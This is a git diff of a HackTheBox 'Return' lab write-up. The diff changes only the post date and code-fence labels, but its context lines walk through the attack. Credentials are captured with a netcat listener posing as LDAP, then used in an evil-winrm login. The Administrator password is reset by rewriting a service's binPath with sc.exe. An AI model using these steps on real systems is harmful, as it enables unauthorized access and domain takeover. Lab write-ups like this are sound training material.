@@ -1,6 +1,6 @@
 ---
 title: "Return"
-date: 2025-06-20
+date: 2024-11-25
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.108
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 20:06 CET
 Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
@@ -80,7 +80,7 @@ We have a web config portal on `port 80`.
 
 So if we start a listener on `389` and send the request:
 
-```bash
+```shell
 $ nc -lnvp 389
 listening on [any] 389 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 63830
@@ -95,7 +95,7 @@ We have `svc-printer:1edFg43012!!`.
 
 Enter via `evil-winrm`.
 
-```bash
+```shell
 $ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
 
 Evil-WinRM shell v3.7
@@ -115,7 +115,7 @@ d7dc8d0ca7c34ad11ee6758818d05458
 
 We have a lot of privileges, so:
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -138,7 +138,7 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 
 We can use the Service Operators group and manipulate a service. Use the `services` command to list them and try one, then set the `binpath` to change the `Administrator` password:
 
-```bash
+```shell
 *Evil-WinRM* PS C:\> sc.exe config VMTools binPath="C:\Windows\System32\cmd.exe /c net user Administrator Buenas123#"
 [SC] ChangeServiceConfig SUCCESS
 *Evil-WinRM* PS C:\> sc.exe stop VMTools
@@ -152,7 +152,7 @@ The service has not been started.
 The service did not respond to the start or control request in a timely fashion.
 ```
 
-```bash
+```shell
 $ evil-winrm -i 10.10.11.108 -u Administrator -p Buenas123#
                                         
 Evil-WinRM shell v3.7
